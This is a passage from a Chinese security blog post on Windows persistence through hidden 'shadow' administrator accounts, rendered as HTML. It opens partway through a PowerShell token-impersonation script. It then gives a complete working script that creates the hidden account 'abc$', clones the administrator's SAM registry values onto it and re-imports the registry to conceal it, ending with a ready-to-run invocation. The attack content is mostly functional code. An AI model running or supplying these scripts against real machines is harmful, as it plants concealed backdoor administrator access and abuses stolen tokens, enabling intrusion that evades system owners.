                <span class="token function">Write-Output</span> <span class="token string">"RevertToSelf failed. Running as:<span class="token function"> $<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserDomainName<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserName<span class="token punctuation">)</span></span>"</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Main function</span>
    <span class="token keyword">function</span> Main
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WindowsPrincipal]</span> <span class="token namespace">[Security.Principal.WindowsIdentity]</span>::GetCurrent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>IsInRole<span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WindowsBuiltInRole]</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">Write-Error</span> <span class="token string">"Script must be run as administrator"</span> <span class="token operator">-</span>ErrorAction Stop
        <span class="token punctuation">}</span>

        <span class="token comment" spellcheck="true">#If running in session 0, force NoUI</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token namespace">[System.Diagnostics.Process]</span>::GetCurrentProcess<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SessionId <span class="token operator">-eq</span> 0<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">Write-Verbose</span> <span class="token string">"Running in Session 0, forcing NoUI (processes in Session 0 cannot have a UI)"</span>
            <span class="token variable">$NoUI</span> = <span class="token boolean">$true</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"RevToSelf"</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            Invoke<span class="token operator">-</span>RevertToSelf <span class="token operator">-</span>ShowOutput
        <span class="token punctuation">}</span>
        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"CreateProcess"</span> <span class="token operator">-or</span> <span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$AllTokens</span> = Enum<span class="token operator">-</span>AllTokens

            <span class="token comment" spellcheck="true">#Select the token to use</span>
            <span class="token namespace">[IntPtr]</span><span class="token variable">$hToken</span> = <span class="token namespace">[IntPtr]</span>::Zero
            <span class="token variable">$UniqueTokens</span> = <span class="token punctuation">(</span>Get<span class="token operator">-</span>UniqueTokens <span class="token operator">-</span>AllTokens <span class="token variable">$AllTokens</span><span class="token punctuation">)</span><span class="token punctuation">.</span>TokenByUser
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Username</span> <span class="token operator">-ne</span> <span class="token variable">$null</span> <span class="token operator">-and</span> <span class="token variable">$Username</span> <span class="token operator">-ne</span> <span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$UniqueTokens</span><span class="token punctuation">.</span>ContainsKey<span class="token punctuation">(</span><span class="token variable">$Username</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$hToken</span> = <span class="token variable">$UniqueTokens</span><span class="token punctuation">[</span><span class="token variable">$Username</span><span class="token punctuation">]</span><span class="token punctuation">.</span>hToken
                    <span class="token function">Write-Verbose</span> <span class="token string">"Selecting token by username"</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">else</span>
                <span class="token punctuation">{</span>
                    <span class="token function">Write-Error</span> <span class="token string">"A token belonging to the specified username was not found. Username:<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Username</span><span class="token punctuation">)</span></span>"</span> <span class="token operator">-</span>ErrorAction Stop
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">elseif</span> <span class="token punctuation">(</span> <span class="token variable">$ProcessId</span> <span class="token operator">-ne</span> <span class="token variable">$null</span> <span class="token operator">-and</span> <span class="token variable">$ProcessId</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span> <span class="token punctuation">|</span> <span class="token function">Get-Member</span> ProcessId<span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>ProcessId <span class="token operator">-eq</span> <span class="token variable">$ProcessId</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$hToken</span> = <span class="token variable">$Token</span><span class="token punctuation">.</span>hToken
                        <span class="token function">Write-Verbose</span> <span class="token string">"Selecting token by ProcessID"</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token function">Write-Error</span> <span class="token string">"A token belonging to ProcessId<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$ProcessId</span><span class="token punctuation">)</span></span> could not be found. Either the process doesn't exist or it is a protected process and cannot be opened."</span> <span class="token operator">-</span>ErrorAction Stop
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$ThreadId</span> <span class="token operator">-ne</span> <span class="token variable">$null</span> <span class="token operator">-and</span> <span class="token variable">$ThreadId</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span> <span class="token punctuation">|</span> <span class="token function">Get-Member</span> ThreadId<span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>ThreadId <span class="token operator">-eq</span> <span class="token variable">$ThreadId</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$hToken</span> = <span class="token variable">$Token</span><span class="token punctuation">.</span>hToken
                        <span class="token function">Write-Verbose</span> <span class="token string">"Selecting token by ThreadId"</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token function">Write-Error</span> <span class="token string">"A token belonging to ThreadId<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$ThreadId</span><span class="token punctuation">)</span></span> could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened."</span> <span class="token operator">-</span>ErrorAction Stop
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$Process</span> <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span> <span class="token punctuation">|</span> <span class="token function">Get-Member</span> ProcessId<span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>ProcessId <span class="token operator">-eq</span> <span class="token variable">$Process</span><span class="token punctuation">.</span>Id<span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$hToken</span> = <span class="token variable">$Token</span><span class="token punctuation">.</span>hToken
                        <span class="token function">Write-Verbose</span> <span class="token string">"Selecting token by Process object"</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token function">Write-Error</span> <span class="token string">"A token belonging to Process<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Process</span><span class="token punctuation">.</span>Name<span class="token punctuation">)</span></span> ProcessId<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Process</span><span class="token punctuation">.</span>Id<span class="token punctuation">)</span></span> could not be found. Either the process doesn't exist or it is a protected process and cannot be opened."</span> <span class="token operator">-</span>ErrorAction Stop
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Error</span> <span class="token string">"Must supply a Username, ProcessId, ThreadId, or Process object"</span>  <span class="token operator">-</span>ErrorAction Stop
            <span class="token punctuation">}</span>

            <span class="token comment" spellcheck="true">#Use the token for the selected action</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$NoUI</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token function">Set</span><span class="token operator">-</span>DesktopACLs
                <span class="token punctuation">}</span>

                Create<span class="token operator">-</span>ProcessWithToken <span class="token operator">-</span>hToken <span class="token variable">$hToken</span> <span class="token operator">-</span>ProcessName <span class="token variable">$CreateProcess</span> <span class="token operator">-</span>ProcessArgs <span class="token variable">$ProcessArgs</span> <span class="token operator">-</span>PassThru:<span class="token variable">$PassThru</span>

                Invoke<span class="token operator">-</span>RevertToSelf
            <span class="token punctuation">}</span>
            <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$ImpersonateUser</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                Invoke<span class="token operator">-</span>ImpersonateUser <span class="token operator">-</span>hToken <span class="token variable">$hToken</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
                <span class="token function">Write-Output</span> <span class="token string">"Running As:<span class="token function"> $<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserDomainName<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserName<span class="token punctuation">)</span></span>"</span>
            <span class="token punctuation">}</span>

            Free<span class="token operator">-</span>AllTokens <span class="token operator">-</span>TokenInfoObjs <span class="token variable">$AllTokens</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"WhoAmI"</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">Write-Output</span> <span class="token string"><span class="token function">"$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserDomainName<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserName<span class="token punctuation">)</span></span>"</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token comment" spellcheck="true">#Enumerate tokens</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$AllTokens</span> = Enum<span class="token operator">-</span>AllTokens

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PsCmdlet</span><span class="token punctuation">.</span>ParameterSetName <span class="token operator">-</span>ieq <span class="token string">"ShowAll"</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Output</span> <span class="token variable">$AllTokens</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Output</span> <span class="token punctuation">(</span>Get<span class="token operator">-</span>UniqueTokens <span class="token operator">-</span>AllTokens <span class="token variable">$AllTokens</span><span class="token punctuation">)</span><span class="token punctuation">.</span>TokenByUser<span class="token punctuation">.</span>Values
            <span class="token punctuation">}</span>

            Invoke<span class="token operator">-</span>RevertToSelf

            Free<span class="token operator">-</span>AllTokens <span class="token operator">-</span>TokenInfoObjs <span class="token variable">$AllTokens</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Start the main function</span>
    Main
<span class="token punctuation">}</span></code></pre>
<p>Windows-User-Clone.ps1脚本内容如下所示：</p>
<pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Create<span class="token operator">-</span>Clone
<span class="token punctuation">{</span>
<span class="token comment" spellcheck="true">&lt;#
.SYNOPSIS
This script requires System privileges. You can use Invoke-TokenManipulation.ps1 to get System privileges and create the clone user.
Link: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1

Author: Evilcg and 3gstuent
Evilcg's way to achieve the same goal:
https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1

.PARAMETER u
The clone username
.PARAMETER p
The clone user's password
.PARAMETER cu
The user to be cloned, default administrator 
.EXAMPLE
Create-Clone -u abc -p abc123 -cu administrator
#></span>
     <span class="token keyword">Param</span><span class="token punctuation">(</span>
        <span class="token namespace">[Parameter(Mandatory=$true)]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$u</span><span class="token punctuation">,</span>

        <span class="token namespace">[Parameter(Mandatory=$true)]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$p</span><span class="token punctuation">,</span>

        <span class="token namespace">[Parameter(Mandatory=$false)]</span>
        <span class="token namespace">[String]</span>
        <span class="token variable">$cu</span> = <span class="token string">"administrator"</span>
    <span class="token punctuation">)</span>


    <span class="token keyword">function</span> Create<span class="token operator">-</span>user <span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$Username</span><span class="token punctuation">,</span><span class="token namespace">[string]</span><span class="token variable">$Password</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{</span>
        <span class="token variable">$group</span> = <span class="token string">"Administrators"</span>
        <span class="token variable">$adsi</span> = <span class="token namespace">[ADSI]</span><span class="token string">"WinNT://<span class="token variable">$env</span>:COMPUTERNAME"</span>
        <span class="token variable">$existing</span> = <span class="token variable">$adsi</span><span class="token punctuation">.</span>Children <span class="token punctuation">|</span> where <span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">.</span>SchemaClassName <span class="token operator">-eq</span> <span class="token string">'user'</span> <span class="token operator">-and</span> <span class="token variable">$_</span><span class="token punctuation">.</span>Name <span class="token operator">-eq</span> <span class="token variable">$Username</span> <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$existing</span> <span class="token operator">-eq</span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">Write-Host</span> <span class="token string">"Creating new local user <span class="token variable">$Username</span> with password <span class="token variable">$Password</span>"</span>
            &amp; NET USER <span class="token variable">$Username</span> <span class="token variable">$Password</span> <span class="token operator">/</span>add <span class="token operator">/</span>y <span class="token operator">/</span>expires:never <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
            <span class="token function">Write-Host</span> <span class="token string">"Adding local user <span class="token variable">$Username</span> to <span class="token variable">$group</span>."</span>
            &amp; NET LOCALGROUP <span class="token variable">$group</span> <span class="token variable">$Username</span> <span class="token operator">/</span>add <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">Write-Host</span> <span class="token string">"[*] Setting password for existing local user <span class="token variable">$Username</span>"</span>
            <span class="token variable">$existing</span><span class="token punctuation">.</span>SetPassword<span class="token punctuation">(</span><span class="token variable">$Password</span><span class="token punctuation">)</span>           
        <span class="token punctuation">}</span>

        <span class="token function">Write-Host</span> <span class="token string">"[*] Ensuring password for <span class="token variable">$Username</span> never expires"</span>
        WMIC USERACCOUNT WHERE <span class="token string">"Name='<span class="token variable">$Username</span>'"</span> <span class="token function">SET</span> PasswordExpires=FALSE
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> GetUser<span class="token operator">-</span>Key<span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$user</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        cmd <span class="token operator">/</span>c <span class="token string">"regedit /e <span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.reg "</span>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$user</span><span class="token string">""</span>
        <span class="token variable">$file</span> = <span class="token function">Get-Content</span> <span class="token string">"<span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.reg"</span>  <span class="token punctuation">|</span> <span class="token function">Out-String</span>
        <span class="token variable">$pattern</span>=<span class="token string">"@=hex\((.*?)\)\:"</span>
        <span class="token variable">$file</span> <span class="token operator">-match</span> <span class="token variable">$pattern</span> <span class="token punctuation">|</span><span class="token function">Out-Null</span>
        <span class="token variable">$key</span> = <span class="token string">"00000"</span><span class="token operator">+</span><span class="token variable">$matches</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span>
        <span class="token function">Write-Host</span> <span class="token variable">$key</span>
        <span class="token keyword">return</span> <span class="token variable">$key</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> Clone <span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$ukey</span><span class="token punctuation">,</span><span class="token namespace">[string]</span><span class="token variable">$cukey</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{</span>
        <span class="token variable">$ureg</span> = <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span>"</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>
        <span class="token variable">$cureg</span> = <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$cukey</span>"</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>       
        <span class="token variable">$cuFreg</span> = <span class="token function">Get-Item</span> <span class="token operator">-</span>Path <span class="token variable">$cureg</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token variable">$cuFvalue</span> = <span class="token variable">$cuFreg</span><span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token string">'F'</span><span class="token punctuation">)</span>
        <span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>path <span class="token variable">$ureg</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">-</span>Name <span class="token string">"F"</span> <span class="token operator">-</span>value <span class="token variable">$cuFvalue</span>
        <span class="token variable">$outreg</span> = <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span>"</span>
        cmd <span class="token operator">/</span>c <span class="token string">"regedit /e <span class="token variable">$env</span>:temp\out.reg <span class="token variable">$outreg</span>.Trim()"</span>
        <span class="token function">Write-Host</span> <span class="token string">"Copy from <span class="token variable">$cu</span> to <span class="token variable">$u</span> success."</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> Main <span class="token punctuation">(</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{</span>

        <span class="token function">Write-Host</span> <span class="token string">"[*] Current token: "</span>  <span class="token operator">-</span>NoNewline
        <span class="token variable">$token</span>=whoami
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span> <span class="token operator">-ne</span> <span class="token string">"nt authority\system"</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">Write-Host</span> <span class="token string">"  "</span> <span class="token variable">$token</span>
            <span class="token function">Write-Host</span> <span class="token string">"[!] Low privileges."</span>
            <span class="token function">Write-Host</span> <span class="token string">"[*] Exit."</span>
            <span class="token keyword">Exit</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> 
        <span class="token punctuation">{</span>
            <span class="token function">Write-Host</span> <span class="token variable">$token</span>
        <span class="token punctuation">}</span>

        <span class="token function">Write-Host</span> <span class="token string">"[*] Create User..."</span>
        Create<span class="token operator">-</span>user <span class="token variable">$u</span> <span class="token variable">$p</span>

        <span class="token function">Write-Host</span> <span class="token string">"[*] Get User <span class="token variable">$u</span>'s Key: "</span>  <span class="token operator">-</span>NoNewline
        <span class="token variable">$ukey</span> = GetUser<span class="token operator">-</span>Key <span class="token variable">$u</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>

        <span class="token function">Write-Host</span> <span class="token string">"[*] Get User <span class="token variable">$cu</span>'s Key: "</span>  <span class="token operator">-</span>NoNewline
        <span class="token variable">$cukey</span> = GetUser<span class="token operator">-</span>Key <span class="token variable">$cu</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>

        <span class="token function">Write-Host</span> <span class="token string">"[*] Try to clone..."</span>
        Clone <span class="token variable">$ukey</span> <span class="token variable">$cukey</span>

        <span class="token function">Write-Host</span> <span class="token string">"[*] Delete User:<span class="token variable">$u</span>"</span>
        Net User <span class="token variable">$u</span> <span class="token operator">/</span><span class="token function">del</span> <span class="token punctuation">|</span><span class="token function">Out-Null</span>

        <span class="token function">Write-Host</span> <span class="token string">"[*] Import the registry"</span>
        cmd <span class="token operator">/</span>c <span class="token string">"regedit /s <span class="token variable">$env</span>:temp\<span class="token variable">$u</span>.reg"</span>
        cmd <span class="token operator">/</span>c <span class="token string">"regedit /s <span class="token variable">$env</span>:temp\out.reg"</span>
        <span class="token function">Write-Host</span> <span class="token string">"[*] Clearn"</span>
        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\<span class="token operator">*</span><span class="token punctuation">.</span>reg
        <span class="token function">Write-Output</span> <span class="token string">"[*] All Done."</span>
    <span class="token punctuation">}</span>    
    Main   
<span class="token punctuation">}</span>
Create<span class="token operator">-</span>Clone <span class="token operator">-</span>u abc$ <span class="token operator">-</span>p 123</code></pre>
<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ul>
<li><a href="https://baike.baidu.com/item/%E5%BD%B1%E5%AD%90%E5%B8%90%E6%88%B7/11044984?fromtitle=%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7&fromid=23689426&fr=aladdin" target="_blank" rel="noopener">影子账户</a></li>
<li><a href="https://www.k2zone.cn/?p=642" target="_blank" rel="noopener">Windows提权建立Administrator的影子账户</a></li>
<li><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/" target="_blank" rel="noopener">渗透技巧——Windows系统的帐户隐藏</a></li>
<li><a href="https://blog.csdn.net/flyliuweisky547/article/details/18565705" target="_blank" rel="noopener">PowerShell如何使用自定义公共函数</a></li>
</ul>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://z1r0s.github.io" rel="external nofollow noreferrer">z1r0s</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://z1r0s.github.io/2020/11/28/quan-xian-wei-chi-zhi-ying-zi-zhang-hu/">https://z1r0s.github.io/2020/11/28/quan-xian-wei-chi-zhi-ying-zi-zhang-hu/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://z1r0s.github.io" target="_blank">z1r0s</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/后渗透/">
                                    <span class="chip bg-color">后渗透</span>
                                </a>
                            
                                <a href="/tags/权限维持/">
                                    <span class="chip bg-color">权限维持</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    
        <style>
    .mvaline-card {
        margin: 1.5rem auto;
    }

    .mvaline-card .card-content {
        padding: 20px 20px 5px 20px;
    }
</style>

<div class="card mvaline-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="mvcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/minivaline/MiniValine.js"></script>
<script>
    new MiniValine({
        el: '#mvcomments',
        appId: 'rr4jTLi2BJEgTziWjmGxpu1a-MdYXbMMI',
        appKey: 'aFRDmu52XNOUP0PyGNjjzDCQ',
        mode: 'DesertsP',
        placeholder: 'Write a Comment',
        pathname: window.location.pathname,
        lang: '',
        adminEmailMd5: 'de8a7aa53d07e6b6bceb45c64027763d',
        tagMeta: ["管理员", "小伙伴", "访客"],
